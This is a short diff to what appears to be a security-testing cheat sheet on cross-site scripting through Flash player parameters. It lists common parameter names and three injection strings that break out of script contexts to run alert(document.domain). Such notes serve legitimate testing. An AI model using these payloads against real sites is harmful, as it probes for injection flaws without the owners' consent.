@@ -46,24 +46,20 @@ Input Vectors:
 
 Common Params:
 onload, allowedDomain, movieplayer, xmlPath, eventhandler, callback (more on OWASP page)
+```
 
+```
 Common Injection Strings:￼
 
-```
 
 \%22})))}catch(e){alert(document.domain);}//
-
 ```
 
 ```
-
 "]);}catch(e){}if(!self.a)self.a=!alert(document.domain);//
-
 ```
 
-
 ```
-
 "a")(({type:"ready"}));}catch(e){alert(1)}//
 
 ```
